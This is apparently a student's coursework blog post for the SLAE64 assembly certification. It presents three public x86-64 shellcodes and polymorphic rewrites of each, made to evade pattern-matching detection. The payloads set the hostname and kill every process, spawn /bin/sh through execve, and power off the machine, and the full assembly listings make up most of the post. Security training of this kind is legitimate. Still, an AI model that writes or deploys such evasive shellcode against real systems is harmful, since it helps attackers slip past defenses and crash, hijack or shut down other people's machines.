# SLAE Assignment #6

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE64 - 1525

## Assignment

* Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
* The polymorphic versions cannot be larger 150% of the existing shellcode
* Bonus points for making it shorter in length than original

## Polymorphic Shellcode1

* Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-605.php
* Original Size: 33 bytes

Creating a file with the original shellcode:

```
 From: http://shell-storm.org/shellcode/files/shellcode-605.php
; Filename: shellcode1.nasm
; Author:  SLAE64 - 1525
;
; Purpose: sethostname() & killall

; sethostname("Rooted !");
; kill(-1, SIGKILL);

section .text

global _start
 
_start:
 
    ;-- setHostName("Rooted !"); 22 bytes --;
    mov     al, 0xaa
    mov     r8, 'Rooted !'
    push    r8
    mov     rdi, rsp
    mov     sil, 0x8
    syscall
 
    ;-- kill(-1, SIGKILL); 11 bytes --;
    push    byte 0x3e
    pop     rax
    push    byte 0xff
    pop     rdi
    push    byte 0x9
    pop     rsi
    syscall
```

Polymorphic version:

```
; From: http://shell-storm.org/shellcode/files/shellcode-605.php
; Filename: shellcode1.poly.nasm
; Author:  SLAE64 - 1525
;
; Purpose: sethostname() & killall

; sethostname("Rooted !");
; kill(-1, SIGKILL);
BITS 64

section .text

SYS_SETHOSTNAME equ 0xaa
SYS_KILL equ 0x3e

global _start
 
_start:
    ;-- setHostName("");
    xor r10, r10
    push byte SYS_SETHOSTNAME
    pop rax
    push r10
    push rsp
    pop rdi
        
    syscall
 
    ;-- kill(-1, SIGKILL);
    push byte SYS_KILL
    pop rax
    mov rdi, r10
    not rdi
    mov rsi, r10
    add rsi, 9

    syscall
```

* New size: 30 bytes
* Dimension ratio: 90% of original

## Polymorphic Shellcode2

* Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-806.php
* Original Size: 27 bytes

Creating a file with the original shellcode:

```
; From: http://shell-storm.org/shellcode/files/shellcode-806.php
; Filename: shellcode2.nasm
; Author: SLAE64 - 1525
;
; Purpose: Execute /bin/sh

section .text

    global _start
 
_start:
    ;mov rbx, 0x68732f6e69622f2f
    ;mov rbx, 0x68732f6e69622fff
    ;shr rbx, 0x8
    ;mov rax, 0xdeadbeefcafe1dea
    ;mov rbx, 0xdeadbeefcafe1dea
    ;mov rcx, 0xdeadbeefcafe1dea
    ;mov rdx, 0xdeadbeefcafe1dea
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
```

Polymorphic version:

```
; From: http://shell-storm.org/shellcode/files/shellcode-806.php
; Filename: shellcode2.nasm
; Author: SLAE64 - 1525
;
; Purpose: Execute /bin/sh
BITS 64
section .text
global _start

SYS_EXECVE equ 0x3b
SH equ 0x68732f6e69622f2f
 
_start:
    sub rax, rax
    mov rdx, rax
    push rax
    mov rbx, SH
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp

    push byte SYS_EXECVE
    pop rax

    syscall
```

* New size: 31 bytes
* Dimension ratio: 114% of original

## Polymorphic Shellcode3

* Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-602.php
* Original Size: 19 bytes

Creating a file with the original shellcode:

```
; From: http://shell-storm.org/shellcode/files/shellcode-602.php
; Filename: shellcode3.nasm
; Author:  SLAE64 - 1525
;
; Purpose: reboot(POWER_OFF)

section .text
    global _start
 
_start:
    mov edx, 0x4321fedc
    mov esi, 0x28121969
    mov edi, 0xfee1dead
    mov al,  0xa9
    syscall
```

Polymorphic version:

```
; From: http://shell-storm.org/shellcode/files/shellcode-602.php
; Filename: shellcode3.poly.nasm
; Author:  SLAE64 - 1525
;
; Purpose: reboot(POWER_OFF)
BITS 64

section .text
global _start

SYS_REBOOT equ 0xa9
CMD equ 0x4321fedc
 
_start:
    mov edx, CMD
    mov esi, edx
    add esi, 0x1B0FE573 ; 0x28121969
    mov edi, esi
    add edi, 0xD6CFC544 ; 0xfee1dead
    
    push byte SYS_REBOOT
    pop rax
    syscall
```

* New size: 26 bytes
* Dimension ratio: 136% of original